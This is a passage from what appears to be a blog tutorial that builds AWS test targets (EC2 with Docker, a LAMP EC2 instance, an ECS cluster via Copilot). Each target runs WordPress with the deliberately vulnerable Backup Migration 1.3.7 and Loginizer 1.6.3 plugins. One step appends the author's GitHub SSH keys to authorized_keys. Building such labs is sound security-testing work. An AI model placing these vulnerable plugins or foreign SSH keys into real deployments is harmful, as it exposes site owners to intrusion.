</pre><td class="rouge-code"><pre>ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"ec2-user@</span><span class="k">${</span><span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="sh">\</span><span class="no">EOF</span><span class="sh">
set -euxo pipefail
sudo dnf install -qy docker
sudo usermod -aG docker ec2-user
sudo systemctl enable --now docker
sudo mkdir -p /usr/local/lib/docker/cli-plugins
sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-</span><span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span><span class="sh"> -o /usr/local/lib/docker/cli-plugins/docker-compose
sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose
sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
</span><span class="no">EOF
</span></pre></table></code></div></div><p>Install WordPress in a container with the vulnerable <a href="https://wordpress.org/plugins/backup-backup/">WordPress Backup Migration Plugin</a> and <a href="https://wordpress.org/plugins/loginizer/">Loginizer</a> plugins:</p><p><a href="https://user-images.githubusercontent.com/6468571/183256208-c68f8f50-d0fd-4dde-85ad-7e2ea828f78e.png" class="popup img-link shimmer"><img src="https://user-images.githubusercontent.com/6468571/183256208-c68f8f50-d0fd-4dde-85ad-7e2ea828f78e.png" alt="Wordpress" width="400" loading="lazy"></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="c"># shellcheck disable=SC2087</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"ec2-user@</span><span class="k">${</span><span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF2</span><span class="sh">
set -euxo pipefail
mkdir -p docker-entrypoint-init.d
cat &gt; docker-entrypoint-init.d/wordpress_plugin_install.sh &lt;&lt; EOF
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install loginizer --version=1.6.3 --activate
EOF
chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh

cat &gt; docker-compose.yml &lt;&lt; EOF
services:
  mariadb:
    # renovate: datasource=docker depName=bitnami/mariadb
    image: docker.io/bitnami/mariadb:11.2
    volumes:
      - 'mariadb_data:/bitnami/mariadb'
    environment:
      - ALLOW_EMPTY_PASSWORD=no
      - MARIADB_USER=</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_USER</span><span class="k">}</span><span class="sh">
      - MARIADB_DATABASE=</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE</span><span class="k">}</span><span class="sh">
      - MARIADB_PASSWORD=</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_PASSWORD</span><span class="k">}</span><span class="sh">
      - MARIADB_ROOT_PASSWORD=</span><span class="k">${</span><span class="nv">MARIADB_ROOT_PASSWORD</span><span class="k">}</span><span class="sh">
  wordpress:
    image: docker.io/bitnami/wordpress:6
    ports:
      - '80:8080'
      - '443:8443'
    volumes:
      - 'wordpress_data:/bitnami/wordpress'
      - '</span><span class="se">\$</span><span class="sh">{PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d'
    depends_on:
      - mariadb
    environment:
      - ALLOW_EMPTY_PASSWORD=no
      - WORDPRESS_USERNAME=</span><span class="k">${</span><span class="nv">WORDPRESS_USERNAME</span><span class="k">}</span><span class="sh">
      - WORDPRESS_PASSWORD=</span><span class="k">${</span><span class="nv">WORDPRESS_PASSWORD</span><span class="k">}</span><span class="sh">
      - WORDPRESS_DATABASE_HOST=mariadb
      - WORDPRESS_DATABASE_PORT_NUMBER=3306
      - WORDPRESS_DATABASE_USER=</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_USER</span><span class="k">}</span><span class="sh">
      - WORDPRESS_DATABASE_PASSWORD=</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_PASSWORD</span><span class="k">}</span><span class="sh">
      - WORDPRESS_DATABASE_NAME=</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE</span><span class="k">}</span><span class="sh">
volumes:
  mariadb_data:
    driver: local
  wordpress_data:
    driver: local
EOF

docker compose up --quiet-pull -d
</span><span class="no">EOF2
</span></pre></table></code></div></div><p>The vulnerable plugins, <a href="https://github.com/rapid7/metasploit-framework/blob/6d8666e35b96b3c16e63acb57381b5efdcafb0d0/documentation/modules/exploit/multi/http/wp_backup_migration_php_filter.md">WordPress Backup Migration Plugin 1.3.7</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/980230e5f1b8b34656f75eda1d5fde47cfd9866c/documentation/modules/auxiliary/scanner/http/wp_loginizer_log_sqli.md">Loginizer 1.6.3</a>, were installed.</p><p>Summarize the WordPress URL, Admin URL, Username, and Password:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"WordPress URL: http://</span><span class="k">${</span><span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="k">}</span><span class="s2">/"</span>
<span class="nb">echo</span> <span class="s2">"WordPress Admin URL: http://</span><span class="k">${</span><span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="k">}</span><span class="s2">/admin"</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Username: </span><span class="k">${</span><span class="nv">WORDPRESS_USERNAME</span><span class="k">}</span><span class="se">\n</span><span class="s2">Password: </span><span class="k">${</span><span class="nv">WORDPRESS_PASSWORD</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><h3 id="create-new-ec2-instance-with-wordpress"><span class="me-2">Create new EC2 instance with Wordpress</span><a href="#create-new-ec2-instance-with-wordpress" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Build a new Amazon Linux 2023 EC2 instance for a standalone WordPress installation:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">SOLUTION_EC2</span><span class="o">=</span><span class="s2">"Amazon-EC2"</span>

aws cloudformation deploy <span class="se">\</span>
  <span class="nt">--parameter-overrides</span> <span class="s2">"EnvironmentName=</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--template-file</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/vpc_cloudformation_template.yml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Environment=dev Solution=</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">"</span>

<span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="o">=</span><span class="si">$(</span>aws cloudformation describe-stacks <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--query</span> <span class="s2">"Stacks[0].Outputs[? OutputKey==</span><span class="se">\`</span><span class="s2">PublicSubnet1</span><span class="se">\`</span><span class="s2"> || OutputKey==</span><span class="se">\`</span><span class="s2">VPC</span><span class="se">\`</span><span class="s2">].{OutputKey:OutputKey,OutputValue:OutputValue}"</span><span class="si">)</span>
<span class="nv">AWS_VPC_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">VPC</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>
<span class="nv">AWS_SUBNET_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">PublicSubnet1</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>

<span class="nb">eval </span>aws cloudformation deploy <span class="nt">--capabilities</span> CAPABILITY_IAM <span class="se">\</span>
  <span class="nt">--parameter-overrides</span> <span class="s2">"instanceType=t4g.medium ec2Name=</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2"> ec2KeyPair=</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2"> vpcID=</span><span class="k">${</span><span class="nv">AWS_VPC_ID</span><span class="k">}</span><span class="s2"> subnetID=</span><span class="k">${</span><span class="nv">AWS_SUBNET_ID</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--template-file</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/AmazonLinux-2023-LAMP-server.yaml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Environment=dev Solution=</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">"</span>

<span class="nv">AWS_EC2_PUBLIC_IP</span><span class="o">=</span><span class="si">$(</span>aws ec2 describe-instances <span class="nt">--filters</span> <span class="s2">"Name=tag:Solution,Values=</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s2">"Reservations[].Instances[].PublicIpAddress"</span> <span class="nt">--output</span> text<span class="si">)</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"ec2-user@</span><span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="s1">'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys'</span>
</pre></table></code></div></div><p>Configure MariaDB and add a <code class="language-plaintext highlighter-rouge">wordpress</code> user with a password:</p><p><a href="https://raw.githubusercontent.com/openshift-integration/kamelet-catalog/2b1264daa55eea1ef4854bd39573d334831cfd27/docs/modules/ROOT/assets/images/kamelets/mariadb-source.svg" class="popup img-link shimmer"><img src="https://raw.githubusercontent.com/openshift-integration/kamelet-catalog/2b1264daa55eea1ef4854bd39573d334831cfd27/docs/modules/ROOT/assets/images/kamelets/mariadb-source.svg" alt="MariaDB" loading="lazy"></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c"># shellcheck disable=SC2087</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"ec2-user@</span><span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF2</span><span class="sh">
sudo mysql --user=root &lt;&lt; </span><span class="se">\E</span><span class="sh">OF
UPDATE mysql.global_priv SET priv=json_set(priv, '</span><span class="nv">$.</span><span class="sh">plugin', 'mysql_native_password', '</span><span class="nv">$.</span><span class="sh">authentication_string', PASSWORD('</span><span class="k">${</span><span class="nv">MARIADB_ROOT_PASSWORD</span><span class="k">}</span><span class="sh">')) WHERE User='root';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DELETE FROM mysql.global_priv WHERE User='';
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test</span><span class="se">\\</span><span class="sh">_%';
CREATE USER '</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_USER</span><span class="k">}</span><span class="sh">'@'localhost' IDENTIFIED BY '</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_PASSWORD</span><span class="k">}</span><span class="sh">';
GRANT ALL PRIVILEGES ON </span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE</span><span class="k">}</span><span class="sh">.* TO '</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_USER</span><span class="k">}</span><span class="sh">'@'localhost';
FLUSH PRIVILEGES;
EOF
</span><span class="no">EOF2
</span></pre></table></code></div></div><p>Install WordPress with the vulnerable <a href="https://wordpress.org/plugins/backup-backup/">WordPress Backup Migration Plugin</a> and <a href="https://wordpress.org/plugins/loginizer/">Loginizer</a> plugins:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c"># shellcheck disable=SC2087</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"ec2-user@</span><span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
set -euxo pipefail
wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
sudo mv wp-cli.phar /usr/local/bin/wp
cd /var/www/html/
wp core download --version=6.5.3
wp config create --dbname="</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE</span><span class="k">}</span><span class="sh">" --dbuser="</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_USER</span><span class="k">}</span><span class="sh">" --dbpass="</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE_PASSWORD</span><span class="k">}</span><span class="sh">"
wp db create
wp core install --url="</span><span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="sh">" --title="My Blog" --admin_user="</span><span class="k">${</span><span class="nv">WORDPRESS_USERNAME</span><span class="k">}</span><span class="sh">" --admin_password="</span><span class="k">${</span><span class="nv">WORDPRESS_PASSWORD</span><span class="k">}</span><span class="sh">" --skip-email --admin_email="info@example.com"
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install loginizer --version=1.6.3 --activate
</span><span class="no">EOF
</span></pre></table></code></div></div><p>Summarize the WordPress URL, Admin URL, Username, and Password:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"WordPress URL: http://</span><span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="s2">/"</span>
<span class="nb">echo</span> <span class="s2">"WordPress Admin URL: http://</span><span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="s2">/wp-admin/"</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Username: </span><span class="k">${</span><span class="nv">WORDPRESS_USERNAME</span><span class="k">}</span><span class="se">\n</span><span class="s2">Password: </span><span class="k">${</span><span class="nv">WORDPRESS_PASSWORD</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><h2 id="create-ecs-cluster-with-wordpress"><span class="me-2">Create ECS cluster with Wordpress</span><a href="#create-ecs-cluster-with-wordpress" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://raw.githubusercontent.com/cellinlab/logos/0557e31ed335e38f7fed1fb6c9081221fea7873d/logos/aws-ecs.svg" class="popup img-link shimmer"><img src="https://raw.githubusercontent.com/cellinlab/logos/0557e31ed335e38f7fed1fb6c9081221fea7873d/logos/aws-ecs.svg" alt="Amazon ECS" width="150" loading="lazy"></a></p><p>Prepare the <code class="language-plaintext highlighter-rouge">wordpress_plugin_install.sh</code> startup script. This script will be used to install the vulnerable <a href="https://wordpress.org/plugins/backup-backup/">WordPress Backup Migration Plugin</a> and <a href="https://wordpress.org/plugins/loginizer/">Loginizer</a> plugins during container startup:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">cd</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">exit
cat</span> <span class="o">&gt;</span> wordpress_plugin_install.sh <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install loginizer --version=1.6.3 --activate
</span><span class="no">EOF
</span><span class="nb">chmod </span>a+x wordpress_plugin_install.sh
</pre></table></code></div></div><p>Create the <code class="language-plaintext highlighter-rouge">startup.sh</code> script. This script will populate environment variables for the <code class="language-plaintext highlighter-rouge">bitnami/wordpress</code> container based on the <code class="language-plaintext highlighter-rouge">WORDPRESSCLUSTER_SECRET</code> produced by Copilot:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nb">cat</span> <span class="o">&gt;</span> startup.sh <span class="o">&lt;&lt;</span> <span class="sh">\</span><span class="no">EOF</span><span class="sh">
#!/bin/sh

# Exit if the secret wasn't populated by the ECS agent
if [ -z "</span><span class="k">${</span><span class="nv">WORDPRESSCLUSTER_SECRET</span><span class="k">}</span><span class="sh">" ]; then
  echo "Environment variable "WORDPRESSCLUSTER_SECRET" with secrets is not populated in environment !!!"
  echo 'It should look like: {"host":"mariadb","port":3306,"dbname":"wordpress","username":"wordpress","password":"password"}'
  exit 1
fi

export WORDPRESS_DATABASE_HOST=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">WORDPRESSCLUSTER_SECRET</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.host'</span><span class="si">)</span><span class="sh">
export WORDPRESS_DATABASE_PORT_NUMBER=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">WORDPRESSCLUSTER_SECRET</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.port'</span><span class="si">)</span><span class="sh">
export WORDPRESS_DATABASE_NAME=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">WORDPRESSCLUSTER_SECRET</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.dbname'</span><span class="si">)</span><span class="sh">
export WORDPRESS_DATABASE_USER=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">WORDPRESSCLUSTER_SECRET</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.username'</span><span class="si">)</span><span class="sh">
export WORDPRESS_DATABASE_PASSWORD=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">WORDPRESSCLUSTER_SECRET</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.password'</span><span class="si">)</span><span class="sh">

/opt/bitnami/scripts/wordpress/entrypoint.sh /opt/bitnami/scripts/apache/run.sh
</span><span class="no">EOF
</span><span class="nb">chmod </span>a+x startup.sh
</pre></table></code></div></div><p>Prepare the <code class="language-plaintext highlighter-rouge">Dockerfile</code>. This file defines how to install <code class="language-plaintext highlighter-rouge">jq</code> into the <a href="https://github.com/bitnami/containers/tree/main/bitnami/wordpress">Bitnami WordPress image</a> and uses the <code class="language-plaintext highlighter-rouge">startup.sh</code> script to start the container:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nb">cat</span> <span class="o">&gt;</span> Dockerfile <span class="o">&lt;&lt;</span> <span class="sh">\</span><span class="no">EOF</span><span class="sh">
FROM docker.io/bitnami/minideb:bookworm as installer
RUN set -eux &amp;&amp; </span><span class="se">\</span><span class="sh">
    apt-get update -q &amp;&amp; </span><span class="se">\</span><span class="sh">
    apt-get install curl -y -q &amp;&amp; </span><span class="se">\</span><span class="sh">
    curl -sLo /usr/local/bin/jq https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 &amp;&amp; </span><span class="se">\</span><span class="sh">
    chmod a+x /usr/local/bin/jq

FROM docker.io/bitnami/wordpress:latest as app
COPY --from=installer /usr/local/bin/jq /usr/bin/jq
COPY startup.sh /opt/copilot/scripts/startup.sh
COPY wordpress_plugin_install.sh /docker-entrypoint-init.d/

ENTRYPOINT ["/bin/sh", "-c"]
CMD ["/opt/copilot/scripts/startup.sh"]
EXPOSE 8080
</span><span class="no">EOF
</span></pre></table></code></div></div><p>Initialize the backend application with Copilot:</p><p><a href="https://raw.githubusercontent.com/aws/copilot-cli/4a1498b4973366c0fde88c5922c61ee3b142855a/site/content/assets/images/copilot-logo-48-light.svg" class="popup img-link shimmer"><img src="https://raw.githubusercontent.com/aws/copilot-cli/4a1498b4973366c0fde88c5922c61ee3b142855a/site/content/assets/images/copilot-logo-48-light.svg" alt="Copilot CLI" width="150" loading="lazy"></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>copilot app init wordpress <span class="nt">--resource-tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2">,Environment=dev,Solution=Amazon-ECS"</span>
</pre></table></code></div></div><p>Create a development environment for the application:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>copilot <span class="nb">env </span>init <span class="nt">--name</span> dev <span class="nt">--default-config</span>
</pre></table></code></div></div><p>Set up the required infrastructure to run our containerized application. Copilot will now proceed to create the VPC, Public Subnets, Private Subnets, a Route53 Private Hosted Zone for service discovery, a custom route table, a Security Group for inter-container communication, and an ECS Cluster to group the ECS services:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>copilot <span class="nb">env </span>deploy <span class="nt">--name</span> dev
</pre></table></code></div></div><p>Create WordPress secrets as SecureString parameters in SSM Parameter Store:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>copilot secret init <span class="nt">--name</span> WORDPRESS_USERNAME <span class="nt">--values</span> <span class="s2">"dev=</span><span class="k">${</span><span class="nv">WORDPRESS_USERNAME</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--overwrite</span>
copilot secret init <span class="nt">--name</span> WORDPRESS_PASSWORD <span class="nt">--values</span> <span class="s2">"dev=</span><span class="k">${</span><span class="nv">WORDPRESS_PASSWORD</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--overwrite</span>
</pre></table></code></div></div><p>Start Docker Desktop or Colima if you are a macOS user:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>colima start
</pre></table></code></div></div><p>Create a manifest file that defines your backend service:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>copilot svc init <span class="nt">--dockerfile</span> Dockerfile <span class="se">\</span>
  <span class="nt">--name</span> wordpress <span class="nt">--port</span> 8080 <span class="nt">--svc-type</span> <span class="s1">'Load Balanced Web Service'</span>
</pre></table></code></div></div><p>Add references to the secrets in <code class="language-plaintext highlighter-rouge">copilot/wordpress/manifest.yml</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">cat</span> <span class="o">&gt;&gt;</span> copilot/wordpress/manifest.yml <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">

secrets:
